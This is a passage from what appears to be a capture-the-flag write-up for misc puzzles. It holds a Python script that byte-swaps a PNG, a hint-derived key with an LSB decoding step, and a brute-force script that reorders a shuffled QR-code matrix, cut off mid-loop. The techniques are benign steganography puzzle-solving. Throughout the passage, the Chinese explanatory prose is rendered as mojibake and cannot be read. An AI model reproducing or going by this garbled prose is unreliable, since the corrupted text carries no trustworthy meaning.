<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;a.png&#x27;</span>,<span class="hljs-string">&#x27;rb&#x27;</span>)<br>f1=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;b.png&#x27;</span>,<span class="hljs-string">&#x27;wb&#x27;</span>)<br><br>data=f.read()<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>,<span class="hljs-built_in">len</span>(data),<span class="hljs-number">2</span>):<br>    f1.write(data[i:i+<span class="hljs-number">2</span>][::-<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure>

<p>å¾—åˆ°hint<code>å¯†é’¥å°±æ˜¯éŸ³ä¹çš„è´¢å¯Œå¯†ç </code>ï¼ŒåŠ ä¸Šé¢˜ç›®æè¿°<code>ä½ çŸ¥é“ä¸‡èƒ½å’Œå¼¦æ˜¯ä»€ä¹ˆå—?</code>ï¼Œå¾—åˆ°<code>4536251</code></p>
<p>lsbè§£å¯†å¾—åˆ°flag</p>
<p><img src="/img/wp/2022/2022qwbqsn-3.png"></p>
<h3 id="misc2"><a href="#misc2" class="headerlink" title="misc2"></a>misc2</h3><p><em>èµ›åå¤ç°</em></p>
<p>ç¥¥äº‘æ¯<code>shuffle_code</code>çš„ååŠéƒ¨åˆ†</p>
<p>æŒ‰è¡Œæ‰“ä¹±äº†<br>ç½‘ä¸Šçš„çˆ†ç ´è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">data = [[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>],[<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">1</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>]]<br><br><span class="hljs-keyword">import</span> pyzbar.pyzbar <span class="hljs-keyword">as</span> pyzbar<br><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> permutations<br><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image, ImageDraw <span class="hljs-keyword">as</span> draw<br><span class="hljs-keyword">import</span> matplotlib.pyplot <span class="hljs-keyword">as</span> plt<br><span class="hljs-keyword">from</span> tqdm <span class="hljs-keyword">import</span> tqdm<br><br>shuffle_1 = [<span class="hljs-number">9</span>, <span class="hljs-number">11</span>, <span class="hljs-number">13</span>, <span class="hljs-number">15</span>, <span class="hljs-number">17</span>, <span class="hljs-number">19</span>]<br>shuffle_2 = [<span class="hljs-number">10</span>, <span class="hljs-number">12</span>, <span class="hljs-number">14</span>, <span class="hljs-number">16</span>, <span class="hljs-number">18</span>]<br>head = data[<span class="hljs-number">0</span>:<span class="hljs-number">9</span>]<br>tail = data[<span class="hljs-number">20</span>:]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">body</span>(<span class="hljs-params">body_1, body_2</span>):<br>    body = []<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">5</span>):<br>        body.append(body_1[i])<br>        body.append(body_2[i])<br>    body.append(body_1[<span class="hljs-number">5</span>])<br>    <span class="hljs-keyword">return</span> [data[i] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> body]<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">draw_img</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) == <span class="hljs-number">29</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(data[<span class="hljs-number">0</span>]) == <span class="hljs-number">29</span><br>    img = Image.new(<span class="hljs-string">&#x27;RGB&#x27;</span>, (<span class="hljs-number">31</span>, <span class="hljs-number">31</span>), (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>    <span class="hljs-keyword">for</span> i, row <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(data):<br>        <span class="hljs-keyword">for</span> j, pixel <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(row):<br>            img.putpixel((j + <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>), (<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>) <span class="hljs-keyword">if</span> pixel == <span class="hljs-number">1</span> <span class="hljs-keyword">else</span> (<span class="hljs-number">255</span>,<span class="hljs-number">255</span>,<span class="hljs-number">255</span>))<br>    <span class="hljs-keyword">return</span> img<br><br><span class="hljs-keyword">with</span> tqdm(total=<span class="hljs-number">720</span> * <span class="hljs-number">120</span>) <span class="hljs-keyword">as</span> pbar:<br>    <span class="hljs-keyword">for</span> body_1 <span class="hljs-keyword">in</span> permutations(shuffle_1):<br>        <span class="hljs-keyword">for</span> body_2 <span class="hljs-keyword">in</span> 